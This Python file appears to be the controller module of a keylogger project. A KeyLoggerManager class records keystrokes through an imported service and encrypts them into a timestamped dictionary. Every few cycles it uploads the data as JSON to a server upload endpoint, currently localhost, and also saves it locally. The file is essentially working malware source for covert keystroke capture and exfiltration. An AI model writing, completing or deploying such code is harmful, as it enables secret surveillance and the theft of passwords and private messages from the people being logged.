from KeyService import KeyLoggerService
from FileWriter import FileWriter
from Encryptor import Encryptor
from NetworkWriter import NetworkWriter
import time
import datetime
import json


class KeyLoggerManager:
    def __init__(self, secret_key):
        self.service = KeyLoggerService()
        self.file_writer = FileWriter()
        self.encryptor = Encryptor(secret_key)
        self.network_writer = NetworkWriter()
        self.data_dic = {}
        self.num_of_enter = 0

    def run(self):
        """Starts the key logging process."""
        self.service.start_logging()
        try:
            while self.service.running:
                time.sleep(5)
                self.add_to_dic()
                self.num_of_enter += 1
                if self.num_of_enter == 3:
                    self.save_locally()
                    self.num_of_enter = 0
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            print(f"An error occurred: {e}")
            self.stop()

    def stop(self):
        """Stops the key logging process."""
        self.service.stop_logging()
       # self.save_locally()  # Optionally save data before stopping
        print("KeyLogger stopped.")

    def add_to_dic(self):
        """Adds logged keys to the dictionary after encryption."""
        logged_keys = "".join(self.service.get_logged_keys())
        encrypted_data = self.encryptor.encrypt(logged_keys)
        self.data_dic[datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")] = encrypted_data
        self.service.buffer.flush()
        print(f"Added {len(logged_keys)} keys to the dictionary.")

    def save_locally(self):
        """Saves data locally and sends it to the server."""
        try:
            self.send_to_server()
            self.file_writer.send_data(self.data_dic, None)
            print("Data saved locally.")
            self.data_dic = {}
        except Exception as e:
            print(f"Failed to save data locally: {e}")

    def send_to_server(self):
        """Sends the encrypted data to the server."""
        json_data = json.dumps(self.data_dic, indent=4)
        self.network_writer.send_data(json_data, "http://127.0.0.1:5000/upload")


if __name__ == "__main__":
    secret_key = "your_secure_secret_key"
    keyManager = KeyLoggerManager(secret_key)
    keyManager.run()
